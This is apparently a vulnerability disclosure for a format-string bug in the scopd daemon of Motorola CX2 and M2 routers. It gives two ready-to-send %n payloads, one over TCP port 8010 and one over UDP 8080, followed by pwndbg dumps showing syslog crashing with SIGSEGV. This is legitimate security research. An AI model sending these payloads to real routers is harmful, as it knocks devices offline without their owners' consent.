# 摩路由格式化字符串漏洞

## link

    http://soplar.cn/product_support.html

## description

    void syslog(int __pri, char * __fmt, ...) cwe-134
    Use of Externally-Controlled Format String

## vuln of format strings

### description

    An issue was discovered in Motorola router CX2 1.01 and M2 1.01. There is an Use of Externally-Controlled Format String, found in scopd ,at TCP port 8010 and UDP port 8080.

### debug

payload1(tcp port 8010)

```python
'\x00\x01\x00Z\x00\x00\x00\x00\x00\x00\x01a{"%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n":{"cmd":"startRmtAssist","code":-1,"msgId":20},"body":{"ip":"192.168.51.1","port":"23333","tunnelPort":"6666","userName":"pwd","passwd":"666666"}}\x0f\xad;\x03'
```

gdb information

```c
Breakpoint 4, 0x00412584 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────
 V0   0x7f8dd318 ◂— 0x64616572 ('read')
 V1   0x7f8dd2f8 ◂— 0x20697246 ('Fri ')
 A0   0x8f
 A1   0x7f8dd318 ◂— 0x64616572 ('read')
 A2   0x0
 A3   0x7f8ddd0d ◂— 0x0
 T0   0x20
 T1   0x30206233 ('3b 0')
 T2   0x807
 T3   0x7fffffff
 T4   0x25
 T5   0x2
 T6   0x7
 T7   0x2
 T8   0x0
 T9   0x773bb730 (_charpad) ◂— lui    $gp, 4
 S0   0x7f8def88 ◂— '/usr/sbin/scopd'
 S1   0x401f60 ◂— lui    $gp, 4
 S2   0x7f8de530 ◂— 0x0
 S3   0x773c28b0 (memcpy) ◂— slti   $t0, $a2, 8
 S4   0x7fc6b150
 S5   0x2
 S6   0xa3e794
 S7   0x9
 S8   0x7f8dd2c0 —▸ 0x773fa3a0 ◂— b      0x773fa544 /* 'h' */
 FP   0x0
 SP   0x7f8dd2c0 —▸ 0x773fa3a0 ◂— b      0x773fa544 /* 'h' */
 PC   0x412584 ◂— jal    0x402590
───────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────
 ► 0x412584    jal    0x402590
   0x412588    nop    
   0x41258c    lui    $v0, 0x44
   0x412590    lw     $v1, -0x4994($v0)
   0x412594    addiu  $v0, $zero, -1
   0x412598    beq    $v1, $v0, 0x4125f0
 
   0x41259c    nop    
   0x4125a0    lui    $v0, 0x44
   0x4125a4    lw     $v1, -0x4994($v0)
   0x4125a8    addiu  $v0, $fp, 0x38
   0x4125ac    move   $a0, $v1
────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────
00:0000│ s8 sp  0x7f8dd2c0 —▸ 0x773fa3a0 ◂— b      0x773fa544 /* 'h' */
01:0004│        0x7f8dd2c4 ◂— 0x0
02:0008│        0x7f8dd2c8 —▸ 0x773f2f20 (__time_str) ◂— 'Fri Nov 24 17:58:34 2017\n'
03:000c│        0x7f8dd2cc ◂— 0x109c
04:0010│        0x7f8dd2d0 ◂— 0x0
... ↓
06:0018│        0x7f8dd2d8 —▸ 0x773f6f70 (__time_tm) ◂— 0x22 /* '"' */
07:001c│        0x7f8dd2dc ◂— 0x2
──────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────
 ► f 0   412584
Breakpoint *0x412584
pwndbg> x/s $a1
0x7f8dd318:	"read_connection: 00 01 00 5a 00 00 00 00 00 00 01 61 {\"%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%"...


// 0041257c 8f 00 04 24     li         a0,0x8f
// 00412580 21 28 40 00     move       a1,v0
// 00412584 64 09 10 0c     jal        syslog                                           void syslog(int __pri, char * __fmt, ...)

```


payload2(udp port 8080)

```python
s.sendto("%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n",("192.168.51.1",8080))
```


```txt
pwndbg> c
Continuing.
warning: GDB can't find the start of the function at 0x40c3f0.

Breakpoint 1, 0x0040c3f0 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────
 V0   0x819da8 ◂— '%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n'
 V1   0x420000 ◂— addiu  $a0, $v0, -0x67a0
 A0   0x426b94 ◂— 'read_connection peer info: %d,%d,%s'
 A1   0x56
 A2   0x2000
 A3   0x819da8 ◂— '%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n'
 T0   0x0
 T1   0x1
 T2   0x81104420
 T3   0x1
 T4   0x958000
 T5   0x950000
 T6   0x1
 T7   0x440000
 T8   0x43a4d8 —▸ 0x77b64148 ◂— lui    $gp, 4
 T9   0x77b64148 ◂— lui    $gp, 4
 S0   0x7fc87f8e ◂— '/usr/sbin/scopd'
 S1   0x401f60 ◂— lui    $gp, 4
 S2   0x7fc86de0 ◂— '192.168.51.196'
 S3   0x77b75510 ◂— slti   $t0, $a2, 8
 S4   0x7fed7008
 S5   0x775a8000
 S6   0x775afb38
 S7   0x775a8000
 S8   0x7fc86d70 —▸ 0x426b7c ◂— 'addr : %s, port : %d'
 FP   0x0
 SP   0x7fc86d70 —▸ 0x426b7c ◂— 'addr : %s, port : %d'
 PC   0x40c3f0 ◂— jal    0x41238c
───────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────
 ► 0x40c3f0    jal    0x41238c
   0x40c3f4    nop    
   0x40c3f8    lw     $v0, 0x898($fp)
   0x40c3fc    addiu  $a0, $v0, 0x1ac
   0x40c400    lw     $v1, 0x6c($fp)
   0x40c404    lw     $v0, 0x898($fp)
   0x40c408    addiu  $v0, $v0, 0x24
   0x40c40c    lw     $a1, 0x898($fp)
   0x40c410    addiu  $a1, $a1, 0x5e
   0x40c414    sw     $a1, 0x10($sp)
   0x40c418    addiu  $a1, $zero, 6
────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────
00:0000│ s8 sp  0x7fc86d70 —▸ 0x426b7c ◂— 'addr : %s, port : %d'
01:0004│        0x7fc86d74 —▸ 0x7fc86de0 ◂— '192.168.51.196'
02:0008│        0x7fc86d78 ◂— 0xa079
03:000c│        0x7fc86d7c ◂— 0x80808080
04:0010│        0x7fc86d80 —▸ 0x75f964 ◂— 0x79a00002
05:0014│        0x7fc86d84 —▸ 0x7fc86ddc ◂— 0x10
06:0018│        0x7fc86d88 ◂— 0x7fed7008
07:001c│        0x7fc86d8c ◂— 0x775a8000
──────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────
 ► f 0   40c3f0
Breakpoint *0x40c3f0

```

gdb information

```c
 V0   0x7fc86589 ◂— 'read_connection peer info: 86,8192,%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n\n'
 V1   0x7fc86568 ◂— 'Sat Apr 15 05:06:52 2017 [19589] read_connection peer info: 86,8192,%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n\n'
 A0   0x8f
 A1   0x7fc86589 ◂— 'read_connection peer info: 86,8192,%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n\n'
 A2   0x0
 A3   0x819dfe ◂— 0x0
 T0   0x6e
 T1   0x6e256e25 ('%n%n')
 T2   0x6e256e25 ('%n%n')
 T3   0x6e256e25 ('%n%n')
 T4   0x6e256e25 ('%n%n')
 T5   0x6e256e25 ('%n%n')
 T6   0x6e256e25 ('%n%n')
 T7   0x6e256e25 ('%n%n')
 T8   0x0
 T9   0x77b72524 ◂— lui    $gp, 3
 S0   0x7fc87f8e ◂— '/usr/sbin/scopd'
 S1   0x401f60 ◂— lui    $gp, 4
 S2   0x7fc86de0 ◂— '192.168.51.196'
 S3   0x77b75510 ◂— slti   $t0, $a2, 8
 S4   0x7fed7008
 S5   0x775a8000
 S6   0x775afb38
 S7   0x775a8000
 S8   0x7fc86530 ◂— 0x0
 FP   0x0
 SP   0x7fc86530 ◂— 0x0
 PC   0x412584 ◂— jal    0x402590
───────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────
 ► 0x412584    jal    0x402590
   0x412588    nop    
   0x41258c    lui    $v0, 0x44
   0x412590    lw     $v1, -0x5dc4($v0)
   0x412594    addiu  $v0, $zero, -1
   0x412598    beq    $v1, $v0, 0x4125f0
 
   0x41259c    nop    
   0x4125a0    lui    $v0, 0x44
   0x4125a4    lw     $v1, -0x5dc4($v0)
   0x4125a8    addiu  $v0, $fp, 0x38
   0x4125ac    move   $a0, $v1
────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────
00:0000│ s8 sp  0x7fc86530 ◂— 0x0
... ↓
02:0008│        0x7fc86538 —▸ 0x77ba0d08 ◂— 'Sat Apr 15 05:06:52 2017\n'
03:000c│        0x7fc8653c ◂— 0x4c85
04:0010│        0x7fc86540 ◂— 0x8
... ↓
06:0018│        0x7fc86548 —▸ 0x77ba467c ◂— 0x34 /* '4' */
07:001c│        0x7fc8654c ◂— 0x2
──────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────
 ► f 0   412584
Breakpoint *0x0412584
pwndbg> c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
warning: GDB can't find the start of the function at 0x77b88d8c.
0x77b88d8c in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────
 V0   0x200
 V1   0x1
 A0   0x0
 A1   0x0
 A2   0x23
 A3   0x0
 T0   0x400
 T1   0x800
 T2   0x807
 T3   0x7fffffff
 T4   0x25
 T5   0x2
 T6   0x7
 T7   0x2
 T8   0x0
 T9   0x77b88d50 ◂— addiu  $v0, $zero, 0x100
 S0   0x7fc865ac ◂— '%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n\n'
 S1   0x23
 S2   0x7fc860cd ◂— 'syslog: read_connection peer info: 86,8192,\n'
 S3   0x23
 S4   0x7fc860b8 ◂— '<143>Apr 15 13:09:33 syslog: read_connection peer info: 86,8192,\n'
 S5   0x7fc86040 ◂— 0xd0
 S6   0x77ba6000 ◂— 'e_info'
 S7   0xffff9008
 S8   0x7fc85ec0 —▸ 0x7fc865ae ◂— '%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n\n'
 FP   0x0
 SP   0x7fc85ea0 ◂— 0x0
 PC   0x77b88d8c ◂— jr     $ra
───────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────
 ► 0x77b88d8c    jr     $ra
    ↓
   0x77b7283c    b      0x77b72c14
    ↓
   0x77b72c14    b      0x77b72db4
    ↓
   0x77b72db4    bnez   $s7, 0x77b72dcc
 
   0x77b72db8    lw     $s0, 0x20($sp)
   0x77b72dbc    b      0x77b72740
    ↓
   0x77b72740    lbu    $v0, ($s0)
   0x77b72744    beqz   $v0, 0x77b7275c
 
   0x77b72748    addiu  $v1, $zero, 0x25
   0x77b7274c    beq    $v0, $v1, 0x77b7275c
 
   0x77b72750    nop    
────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────
00:0000│ sp  0x7fc85ea0 ◂— 0x0
01:0004│     0x7fc85ea4 ◂— 0x73 /* 's' */
02:0008│     0x7fc85ea8 ◂— 0x0
03:000c│     0x7fc85eac ◂— 0x20 /* ' ' */
04:0010│     0x7fc85eb0 ◂— 0x0
05:0014│     0x7fc85eb4 ◂— 0x1
06:0018│     0x7fc85eb8 —▸ 0x77ba83b0 ◂— lw     $a2, 0x24($sp) /* '$' */
07:001c│     0x7fc85ebc ◂— 0x10000
──────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────
 ► f 0 77b88d8c
Program received signal SIGSEGV (fault address 0x0)

```
